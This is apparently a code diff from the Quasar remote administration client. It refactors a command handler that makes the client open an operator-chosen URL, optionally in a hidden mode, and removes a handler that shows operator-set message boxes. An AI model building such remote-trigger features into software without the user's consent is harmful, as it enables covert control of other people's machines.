@@ -1,25 +1,41 @@
 ﻿using Quasar.Common.Messages;
+using Quasar.Common.Networking;
 using System;
 using System.Diagnostics;
 using System.Net;
-using System.Threading;
-using System.Windows.Forms;
 
-namespace Quasar.Client.Commands
+namespace Quasar.Client.Messages
 {
-    /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
-    public static partial class CommandHandler
+    public class WebsiteVisitorHandler : MessageProcessorBase<object>
     {
-        public static void HandleDoVisitWebsite(DoVisitWebsite command, Networking.Client client)
+        public WebsiteVisitorHandler() : base(false)
         {
-            string url = command.Url;
+        }
+
+        public override bool CanExecute(IMessage message) => message is DoVisitWebsite;
+
+        public override bool CanExecuteFrom(ISender sender) => true;
+
+        public override void Execute(ISender sender, IMessage message)
+        {
+            switch (message)
+            {
+                case DoVisitWebsite msg:
+                    Execute(sender, msg);
+                    break;
+            }
+        }
+
+        private void Execute(ISender client, DoVisitWebsite message)
+        {
+            string url = message.Url;
 
             if (!url.StartsWith("http"))
                 url = "http://" + url;
 
             if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
             {
-                if (!command.Hidden)
+                if (!message.Hidden)
                     Process.Start(url);
                 else
                 {
@@ -41,21 +57,13 @@ namespace Quasar.Client.Commands
                     }
                 }
 
-                client.Send(new SetStatus {Message = "Visited Website"});
+                client.Send(new SetStatus { Message = "Visited Website" });
             }
         }
 
-        public static void HandleDoShowMessageBox(DoShowMessageBox command, Networking.Client client)
+        protected override void Dispose(bool disposing)
         {
-            new Thread(() =>
-            {
-                MessageBox.Show(command.Text, command.Caption,
-                    (MessageBoxButtons) Enum.Parse(typeof(MessageBoxButtons), command.Button),
-                    (MessageBoxIcon) Enum.Parse(typeof(MessageBoxIcon), command.Icon),
-                    MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
-            }).Start();
 
-            client.Send(new SetStatus {Message = "Showed Messagebox"});
         }
     }
 }
